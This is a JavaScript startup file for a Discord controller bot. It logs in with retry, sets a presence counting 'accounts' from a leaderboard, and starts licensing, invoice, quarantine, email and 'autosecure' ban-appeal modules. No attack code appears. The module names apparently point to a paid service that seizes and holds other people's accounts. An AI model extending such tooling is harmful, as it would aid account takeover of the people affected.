const discord = require("discord.js");
const { queryParams } = require('../db/database.js');
const { tokens, guildid, welcomechannel } = require("../configLoader");
const emailHandler = require("./handlers/emailHandler.js");
const eventHandler = require("./handlers/eventHandler.js");
const { startLicenseChecker } = require('./utils/licensechecker.js');
const { startLeaderboardUpdater } = require('./utils/leaderboardupdater.js');
const { startStatsLoop } = require('./utils/statsupdater.js');
const { setupMemberHandler } = require('./handlers/welcomeHandler.js');
const { autosecurelogs, initializelogs } = require('../autosecure/utils/embeds/autosecurelogs.js')
const { initializequarantine } = require('./handlers/quarantineMap.js')
const { initializeNotificationSystem } = require('./utils/usernotifications.js')
const { initializeInvoices } = require('./utils/purchase/combined.js')
const { initializeappealclient } = require("../autosecure/utils/bancheckappeal/appealmsg.js");
const checkroles = require("./utils/checkroles.js");
const { setMainBotClient } = require('./handlers/botHandler.js');
const { initializeAutoPanels } = require('./utils/autoPanels.js');
/*
Starts VinGr0ups3cur3 API
*/
require("./handlers/handleapi.js")

const activityTypes = {
    PLAYING: 0,
    STREAMING: 1,
    LISTENING: 2,
    WATCHING: 3,
    COMPETING: 4
};

const { Client, GatewayIntentBits, Partials } = require('discord.js');
const { oldfinishedappeals } = require("./handlers/handleappealnapi.js");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.GuildVoiceStates
    ],
    partials: [
        Partials.Message,
        Partials.Channel,
        Partials.Reaction,
        Partials.GuildMember,
        Partials.User
    ],
    ws: { properties: { browser: "Discord iOS" } }
});





const { registerClient } = require("../autosecure/utils/process/gracefulShutdown");
registerClient(client);

client.tickets = new Map();
client.cooldowns = new discord.Collection();

if (tokens && tokens[0] && tokens[0] !== 'LOAD_FROM_ENV') {
    eventHandler(client, tokens[0]);
}

client.on('error', (err) => {
    console.error('[DISCORD CLIENT ERROR]', err?.message || err);
});

client.on('shardError', (err) => {
    console.warn('[DISCORD SHARD ERROR]', err?.message || err);
});

async function setBotPresenceAndStatus() {
    try {
        if (!client.user) return;
        const sumQuery = await queryParams("SELECT SUM(amount) as total FROM leaderboard");
        const accCount = (sumQuery && sumQuery[0] && sumQuery[0].total) ? parseInt(sumQuery[0].total) : 0;

        await client.user.setPresence({
            activities: [{
                name: `${accCount.toLocaleString()} accounts`,
                type: 3 
            }],
            status: 'online'
        });
    } catch (error) {
        console.error(`Failed to set presence and status: ${error.message}`);
    }
}

async function initializeController() {
    console.log(`[BOT] Initializing controller bot...`);
    const botToken = tokens && tokens[0];
    if (!botToken || botToken === 'LOAD_FROM_ENV') {
        console.warn('[BOT] No valid Discord BOT_TOKEN provided. Skipping controller bot startup.');
        return false;
    }

    try {
        client.queryParams = async (query, params = [], method = "all") => {
            return queryParams(query, params, method);
        };

        const readyPromise = new Promise((resolve) => {
            if (client.isReady && client.isReady()) {
                return resolve();
            }
            client.once("ready", async () => {
                try {
                    const clientId = client.user.id;
                    setMainBotClient(client);
                    autosecurelogs(client, 'startbots', clientId, null, null, null, null);
                    initializequarantine();
                    emailHandler.initialize(client);

                    setBotPresenceAndStatus();
                    setInterval(setBotPresenceAndStatus, 300000);

                    initializeNotificationSystem(client);

                    await Promise.allSettled([
                        startLicenseChecker(client),
                        setupMemberHandler(client),
                        initializelogs(client),
                        initializeappealclient(client),
                        oldfinishedappeals(),
                        checkroles(client),
                        initializeAutoPanels(client),
                        startStatsLoop(client),
                        startLeaderboardUpdater(client).then(stop => {
                            client.leaderboardCleanup = stop;
                        })
                    ]);
                } catch (readyErr) {
                    console.error('[BOT READY ERROR]:', readyErr);
                } finally {
                    resolve();
                }
            });
        });

        // Bounded retry with exponential backoff for transient DNS / network errors
        const maxRetries = 5;
        let connected = false;

        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                console.log(`[BOT] Connecting to Discord Gateway (attempt ${attempt}/${maxRetries})...`);
                await client.login(botToken);
                connected = true;
                break;
            } catch (loginErr) {
                const isTransient = loginErr && (
                    loginErr.code === 'ENOTFOUND' ||
                    loginErr.code === 'EAI_AGAIN' ||
                    loginErr.code === 'ECONNRESET' ||
                    loginErr.code === 'ETIMEDOUT' ||
                    (loginErr.message && (loginErr.message.includes('getaddrinfo') || loginErr.message.includes('fetch failed')))
                );

                if (isTransient && attempt < maxRetries) {
                    const delay = Math.min(2000 * Math.pow(2, attempt - 1), 16000);
                    console.warn(`[BOT] Transient connection failure (${loginErr.code || loginErr.message}). Retrying in ${delay / 1000}s...`);
                    await new Promise(r => setTimeout(r, delay));
                    continue;
                }

                console.error(`[BOT] Failed to login to Discord:`, loginErr.message);
                return false;
            }
        }

        if (connected) {
            // Await client ready with bounded 20s timeout so dependents don't race
            const readyTimeout = new Promise(r => setTimeout(r, 20000));
            await Promise.race([readyPromise, readyTimeout]);
            console.log(`[BOT] Controller bot login complete (Ready: ${client.isReady ? client.isReady() : false}).`);
            return true;
        }

        return false;
    } catch (error) {
        console.error("Error in initializeController:", error.message);
        return false;
    }
}

module.exports = { initializeController, client };
